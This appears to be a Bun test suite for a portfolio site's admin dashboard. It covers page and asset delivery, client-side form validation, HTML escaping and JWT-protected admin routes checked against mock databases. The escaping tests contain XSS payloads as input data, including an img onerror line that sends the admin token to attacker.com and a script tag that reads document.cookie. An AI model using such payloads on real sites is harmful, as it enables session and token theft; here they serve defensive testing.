import { describe, expect, it } from 'bun:test';
import { createServer } from '../../src/index';
import { signAuthToken } from '../../src/utils/jwt';

describe('Admin Dashboard & Authentication (Task 8)', () => {
  const app = createServer();
  const testJwtSecret = 'test_admin_dashboard_secret_key_12345';

  // --------------------------------------------------------------------------
  // 1. Serving Login & Admin Pages
  // --------------------------------------------------------------------------
  describe('HTML Page Delivery', () => {
    it('GET /login returns 200 OK with login form and security elements', async () => {
      const res = await app.handle(new Request('http://localhost/login'));
      expect(res.status).toBe(200);

      const contentType = res.headers.get('content-type') || '';
      expect(contentType).toContain('text/html');

      const html = await res.text();
      expect(html).toContain('<!DOCTYPE html>');
      expect(html).toContain('Admin Login &bull; irfan.Lab');
      expect(html).toContain('id="login-form"');
      expect(html).toContain('id="login-email"');
      expect(html).toContain('id="login-password"');
      expect(html).toContain('id="login-feedback"');
      expect(html).toContain('id="login-submit-btn"');
      expect(html).toContain('href="/css/admin.css"');
      expect(html).toContain('src="/js/admin.js"');
    });

    it('GET /admin returns 200 OK with admin layout, navigation, and modal structures', async () => {
      const res = await app.handle(new Request('http://localhost/admin'));
      expect(res.status).toBe(200);

      const contentType = res.headers.get('content-type') || '';
      expect(contentType).toContain('text/html');

      const html = await res.text();
      expect(html).toContain('<!DOCTYPE html>');
      expect(html).toContain('Admin Dashboard &bull; irfan.Lab');

      // Sidebar & Navigation
      expect(html).toContain('id="admin-sidebar"');
      expect(html).toContain('id="nav-overview"');
      expect(html).toContain('id="nav-projects"');
      expect(html).toContain('id="nav-experiences"');
      expect(html).toContain('id="nav-contacts"');

      // Views
      expect(html).toContain('id="view-overview"');
      expect(html).toContain('id="view-projects"');
      expect(html).toContain('id="view-experiences"');
      expect(html).toContain('id="view-contacts"');

      // Modals
      expect(html).toContain('id="project-modal"');
      expect(html).toContain('id="experience-modal"');
      expect(html).toContain('id="category-modal"');
      expect(html).toContain('id="delete-category-modal"');
      expect(html).toContain('id="contact-detail-modal"');
      expect(html).toContain('id="confirm-modal"');
      expect(html).toContain('id="btn-delete-category"');

      // Assets
      expect(html).toContain('href="/css/admin.css"');
      expect(html).toContain('src="/js/admin.js"');
    });
  });

  // --------------------------------------------------------------------------
  // 2. Serving Admin Assets
  // --------------------------------------------------------------------------
  describe('Static Assets Delivery', () => {
    it('GET /css/admin.css returns 200 OK with admin styling rules', async () => {
      const res = await app.handle(new Request('http://localhost/css/admin.css'));
      expect(res.status).toBe(200);

      const css = await res.text();
      expect(css).toContain('.admin-sidebar');
      expect(css).toContain('.stats-grid');
      expect(css).toContain('.data-table');
      expect(css).toContain('.modal-dialog');
      expect(css).toContain('.btn-danger');
      expect(css).toContain('.filter-btn-group');
    });

    it('GET /js/admin.js returns 200 OK with client admin functions and XSS escaping', async () => {
      const res = await app.handle(new Request('http://localhost/js/admin.js'));
      expect(res.status).toBe(200);

      const js = await res.text();
      expect(js).toContain('function escapeHtml');
      expect(js).toContain('function adminFetch');
      expect(js).toContain('function handleViewSwitch');
      expect(js).toContain('function loadOverviewData');
      expect(js).toContain('function setupProjectsCRUD');
      expect(js).toContain('function setupExperiencesCRUD');
      expect(js).toContain('function setupContactsManagement');
      expect(js).toContain('/api/auth/login');
      expect(js).toContain('/api/admin/projects');
      expect(js).toContain('/api/admin/experiences');
      expect(js).toContain('/api/admin/contacts');
    });
  });

  // --------------------------------------------------------------------------
  // 3. Client-Side Security: HTML Escaping
  // --------------------------------------------------------------------------
  describe('Client-Side Security: escapeHtml Unit Tests', () => {
    function escapeHtml(str: string | null | undefined): string {
      if (str === null || str === undefined) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }

    it('escapes dangerous tags from malicious project or experience titles', () => {
      const input = '<img src=x onerror="fetch(\'http://attacker.com?t=\'+sessionStorage.getItem(\'admin_token\'))">';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('&lt;img');
      expect(escaped).toContain('&quot;');
    });

    it('escapes contact message injection payloads', () => {
      const maliciousMessage = 'Hello <script>document.cookie</script> & goodbye "test"';
      const escaped = escapeHtml(maliciousMessage);
      expect(escaped).toBe('Hello &lt;script&gt;document.cookie&lt;/script&gt; &amp; goodbye &quot;test&quot;');
    });

    it('handles falsy values without crashing', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml('')).toBe('');
    });
  });

  // --------------------------------------------------------------------------
  // 4. Client-Side Validation Logic
  // --------------------------------------------------------------------------
  describe('Form Validation Rules', () => {
    describe('Login Form Validation', () => {
      function validateLogin(email: string, pass: string) {
        if (!email || !pass) return { valid: false, error: 'Email and password required' };
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return { valid: false, error: 'Invalid email' };
        return { valid: true };
      }

      it('accepts well-formed email and non-empty password', () => {
        expect(validateLogin('admin@example.com', 'SuperSecretPass123!').valid).toBe(true);
      });

      it('rejects empty fields', () => {
        expect(validateLogin('', 'password').valid).toBe(false);
        expect(validateLogin('admin@example.com', '').valid).toBe(false);
      });

      it('rejects invalid email formats', () => {
        expect(validateLogin('admin-not-an-email', 'password').valid).toBe(false);
      });
    });

    describe('Project Form Validation', () => {
      function validateProject(data: { title: string; category: string; techStack: string; description: string }) {
        if (!data.title?.trim()) return { valid: false, error: 'Title is required' };
        if (!data.category?.trim()) return { valid: false, error: 'Category is required' };
        if (!data.techStack?.trim()) return { valid: false, error: 'Tech stack is required' };
        if (!data.description?.trim()) return { valid: false, error: 'Description is required' };
        return { valid: true };
      }

      it('accepts complete project payload', () => {
        const res = validateProject({
          title: 'Automated API Test Suite',
          category: 'API Testing',
          techStack: 'Playwright, TypeScript, Docker',
          description: 'Comprehensive automated test suite for microservices.',
        });
        expect(res.valid).toBe(true);
      });

      it('rejects missing required project fields', () => {
        expect(validateProject({ title: '', category: 'QA', techStack: 'Jest', description: 'Desc' }).valid).toBe(false);
        expect(validateProject({ title: 'Test', category: '', techStack: 'Jest', description: 'Desc' }).valid).toBe(false);
        expect(validateProject({ title: 'Test', category: 'QA', techStack: '', description: 'Desc' }).valid).toBe(false);
        expect(validateProject({ title: 'Test', category: 'QA', techStack: 'Jest', description: '' }).valid).toBe(false);
      });
    });

    describe('Experience Form Validation', () => {
      function validateExperience(data: {
        company: string;
        role: string;
        startDate: string;
        endDate?: string | null;
        isCurrent: boolean;
        description: string;
      }) {
        if (!data.company?.trim()) return { valid: false, error: 'Company is required' };
        if (!data.role?.trim()) return { valid: false, error: 'Role is required' };
        if (!data.startDate?.trim()) return { valid: false, error: 'Start date is required' };
        if (!data.description?.trim()) return { valid: false, error: 'Description is required' };

        if (!data.isCurrent && data.endDate && data.startDate > data.endDate) {
          return { valid: false, error: 'startDate cannot be after endDate' };
        }
        return { valid: true };
      }

      it('accepts valid experience with valid date range', () => {
        const res = validateExperience({
          company: 'Acme QA Labs',
          role: 'Lead SDET',
          startDate: '2023-01-01',
          endDate: '2024-06-30',
          isCurrent: false,
          description: 'Designed automation framework.',
        });
        expect(res.valid).toBe(true);
      });

      it('accepts ongoing current position without endDate', () => {
        const res = validateExperience({
          company: 'Acme QA Labs',
          role: 'Lead SDET',
          startDate: '2024-01-01',
          endDate: null,
          isCurrent: true,
          description: 'Currently building test harnesses.',
        });
        expect(res.valid).toBe(true);
      });

      it('rejects startDate greater than endDate for past positions', () => {
        const res = validateExperience({
          company: 'Acme QA Labs',
          role: 'Lead SDET',
          startDate: '2025-01-01',
          endDate: '2024-01-01',
          isCurrent: false,
          description: 'Invalid timeline.',
        });
        expect(res.valid).toBe(false);
        expect(res.error).toBe('startDate cannot be after endDate');
      });
    });
  });

  // --------------------------------------------------------------------------
  // 5. Backend Authorization Enforcement (Mock Verification)
  // --------------------------------------------------------------------------
  describe('Backend Security Guard Enforcement', () => {
    it('rejects access to /api/admin/projects when Authorization header is missing', async () => {
      const res = await app.handle(new Request('http://localhost/api/admin/projects'));
      expect(res.status).toBe(401);
      const json = (await res.json()) as any;
      expect(json.status).toBe('error');
      expect(json.message).toContain('Unauthorized');
    });

    it('rejects access to /api/admin/experiences with an invalid Bearer token', async () => {
      const res = await app.handle(
        new Request('http://localhost/api/admin/experiences', {
          headers: { Authorization: 'Bearer this_is_definitely_an_invalid_token' },
        })
      );
      expect(res.status).toBe(401);
      const json = (await res.json()) as any;
      expect(json.status).toBe('error');
    });

    it('rejects access to /api/admin/contacts with an invalid Bearer token', async () => {
      const res = await app.handle(
        new Request('http://localhost/api/admin/contacts', {
          headers: { Authorization: 'Bearer invalid_token_xyz' },
        })
      );
      expect(res.status).toBe(401);
      const json = (await res.json()) as any;
      expect(json.status).toBe('error');
    });

    it('allows access when valid token and mock db with admin user are provided', async () => {
      const token = await signAuthToken(
        { id: 99, email: 'admin@example.com', role: 'admin' },
        testJwtSecret
      );

      const mockDb = {
        select: () => ({
          from: () => ({
            where: () => ({
              limit: async () => [{ id: 99, name: 'Admin User', email: 'admin@example.com', role: 'admin' }],
              orderBy: async () => [],
            }),
            orderBy: async () => [
              {
                id: 1,
                title: 'Mock Project',
                slug: 'mock-project',
                description: 'Test project',
                category: 'Testing',
                techStack: 'Bun, Elysia',
                githubUrl: null,
                liveDemoUrl: null,
                imageUrl: null,
                isFeatured: true,
                sortOrder: 1,
                createdAt: new Date(),
                updatedAt: new Date(),
              },
            ],
          }),
        }),
      };

      const authedApp = createServer({ db: mockDb as any, jwtSecret: testJwtSecret });
      const res = await authedApp.handle(
        new Request('http://localhost/api/admin/projects', {
          headers: { Authorization: `Bearer ${token}` },
        })
      );

      expect(res.status).toBe(200);
      const json = (await res.json()) as any;
      expect(json.status).toBe('success');
      expect(json.data.length).toBe(1);
      expect(json.data[0].title).toBe('Mock Project');
    });

    it('rejects unauthenticated DELETE /api/admin/tech-stacks/category/:categoryName', async () => {
      const res = await app.handle(
        new Request('http://localhost/api/admin/tech-stacks/category/QA%20Methodologies', {
          method: 'DELETE',
        })
      );
      expect(res.status).toBe(401);
      const json = (await res.json()) as any;
      expect(json.status).toBe('error');
    });

    it('deletes all tech stacks in category when authenticated and category exists', async () => {
      const token = await signAuthToken(
        { id: 99, email: 'admin@example.com', role: 'admin' },
        testJwtSecret
      );

      let deletedCategory = '';

      const mockDb = {
        select: () => ({
          from: () => ({
            where: () => {
              const items = [
                { id: 1, name: 'Cypress', category: 'Automation Tools' },
                { id: 2, name: 'Playwright', category: 'Automation Tools' },
              ];
              return Object.assign(Promise.resolve(items), {
                limit: async () => [{ id: 99, name: 'Admin User', email: 'admin@example.com', role: 'admin' }],
              });
            },
          }),
        }),
        delete: () => ({
          where: async () => {
            deletedCategory = 'Automation Tools';
            return [{ affectedRows: 2 }];
          },
        }),
      };

      const authedApp = createServer({ db: mockDb as any, jwtSecret: testJwtSecret });
      const res = await authedApp.handle(
        new Request('http://localhost/api/admin/tech-stacks/category/Automation%20Tools', {
          method: 'DELETE',
          headers: { Authorization: `Bearer ${token}` },
        })
      );

      expect(res.status).toBe(200);
      const json = (await res.json()) as any;
      expect(json.status).toBe('success');
      expect(json.deletedCount).toBe(2);
      expect(json.message).toContain('Automation Tools');
      expect(deletedCategory).toBe('Automation Tools');
    });

    it('returns 404 when attempting to delete non-existent category', async () => {
      const token = await signAuthToken(
        { id: 99, email: 'admin@example.com', role: 'admin' },
        testJwtSecret
      );

      const mockDb = {
        select: () => ({
          from: () => ({
            where: () => {
              return Object.assign(Promise.resolve([]), {
                limit: async () => [{ id: 99, name: 'Admin User', email: 'admin@example.com', role: 'admin' }],
              });
            },
          }),
        }),
      };

      const authedApp = createServer({ db: mockDb as any, jwtSecret: testJwtSecret });
      const res = await authedApp.handle(
        new Request('http://localhost/api/admin/tech-stacks/category/NonExistentCategory', {
          method: 'DELETE',
          headers: { Authorization: `Bearer ${token}` },
        })
      );

      expect(res.status).toBe(404);
      const json = (await res.json()) as any;
      expect(json.status).toBe('error');
      expect(json.message).toContain('not found');
    });
  });
});

